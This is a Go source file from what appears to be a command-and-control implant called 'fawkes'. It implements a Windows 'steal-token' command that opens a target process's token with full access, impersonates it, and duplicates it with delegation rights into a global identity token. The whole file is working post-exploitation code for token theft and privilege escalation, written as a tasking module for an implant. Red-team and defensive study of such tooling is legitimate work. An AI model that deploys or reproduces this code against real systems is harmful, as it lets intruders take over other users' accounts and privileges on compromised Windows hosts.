//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32                  = windows.NewLazySystemDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf          = advapi32.NewProc("RevertToSelf")
	
	// Global token handle - like xenon's gIdentityToken
	gIdentityToken windows.Token
)

type StealTokenCommand struct{}

func (c *StealTokenCommand) Name() string {
	return "steal-token"
}

func (c *StealTokenCommand) Description() string {
	return "Steal and impersonate a token from another process"
}

func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		PID int `json:"pid"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := stealToken(uint32(params.PID))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to steal token: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func stealToken(pid uint32) (string, error) {
	var debugLog strings.Builder
	var output string

	debugLog.WriteString("[DEBUG] Starting token steal operation...\n")

	// Revert any existing token impersonation (like xenon's IdentityAgentRevertToken)
	if gIdentityToken != 0 {
		debugLog.WriteString("[DEBUG] Closing existing gIdentityToken and reverting...\n")
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		procRevertToSelf.Call()
	}

	// Get current identity before stealing (for output)
	debugLog.WriteString("[DEBUG] Getting current identity...\n")
	processHandle, err := windows.GetCurrentProcess()
	if err == nil {
		var processToken windows.Token
		err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &processToken)
		if err == nil {
			defer processToken.Close()
			processUser, err := processToken.GetTokenUser()
			if err == nil {
				processUsername, processDomain, _, err := processUser.User.Sid.LookupAccount("")
				if err == nil {
					output += fmt.Sprintf("Old identity: %s\\%s\n", processDomain, processUsername)
					debugLog.WriteString(fmt.Sprintf("[DEBUG] Current identity: %s\\%s\n", processDomain, processUsername))
				}
			}
		}
	}

	// Open target process (like xenon: OpenProcess with PROCESS_QUERY_INFORMATION)
	debugLog.WriteString(fmt.Sprintf("[DEBUG] Opening process PID %d...\n", pid))
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return debugLog.String() + output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	debugLog.WriteString("[DEBUG] OpenProcess succeeded\n")

	// Open process token with TOKEN_ALL_ACCESS (exactly like xenon)
	debugLog.WriteString("[DEBUG] Opening process token with TOKEN_ALL_ACCESS...\n")
	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
	if err != nil {
		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken succeeded, token: 0x%x\n", hToken))

	// Get target identity for output
	var targetUsername, targetDomain string
	tokenUser, err := hToken.GetTokenUser()
	if err == nil {
		targetUsername, targetDomain, _, err = tokenUser.User.Sid.LookupAccount("")
		if err == nil {
			output += fmt.Sprintf("Target identity: %s\\%s (PID: %d)\n", targetDomain, targetUsername, pid)
			debugLog.WriteString(fmt.Sprintf("[DEBUG] Target identity: %s\\%s\n", targetDomain, targetUsername))
		}
	}

	// Impersonate using the primary token (like xenon line 134-141)
	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser on primary token...\n")
	ret, _, _ := procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if ret == 0 {
		hToken.Close()
		lastErr := windows.GetLastError()
		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser failed (lastErr=0x%x)", lastErr)
	}
	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser succeeded\n")

	// Duplicate the token into gIdentityToken (like xenon line 140-145)
	debugLog.WriteString("[DEBUG] Duplicating token with DuplicateTokenEx...\n")
	err = windows.DuplicateTokenEx(
		hToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&gIdentityToken,
	)
	if err != nil {
		hToken.Close()
		return debugLog.String() + output, fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}
	debugLog.WriteString(fmt.Sprintf("[DEBUG] DuplicateTokenEx succeeded, gIdentityToken: 0x%x\n", gIdentityToken))

	// Impersonate with the duplicated token (like xenon line 147-153)
	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser on duplicated token...\n")
	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(gIdentityToken))
	if ret == 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		hToken.Close()
		lastErr := windows.GetLastError()
		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser (duplicated token) failed (lastErr=0x%x)", lastErr)
	}
	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser (duplicated token) succeeded\n")

	// Close the original hToken (we now use gIdentityToken)
	hToken.Close()
	debugLog.WriteString("[DEBUG] Closed original hToken\n")

	// Verify impersonation
	debugLog.WriteString("[DEBUG] Verifying impersonation...\n")
	var hThreadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &hThreadToken)
	if err != nil {
		output += "Impersonation completed (verification failed)\n"
		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenThreadToken failed: %v\n", err))
	} else {
		defer hThreadToken.Close()
		threadTokenUser, err := hThreadToken.GetTokenUser()
		if err == nil {
			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
			if err == nil {
				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
				debugLog.WriteString(fmt.Sprintf("[DEBUG] Verified: %s\\%s\n", currentDomain, currentUsername))
			} else {
				output += "Successfully impersonated (verification lookup failed)"
				debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupAccount failed: %v\n", err))
			}
		} else {
			output += "Successfully impersonated (verification GetTokenUser failed)"
			debugLog.WriteString(fmt.Sprintf("[DEBUG] GetTokenUser failed: %v\n", err))
		}
	}

	return debugLog.String() + "\n" + output, nil
}
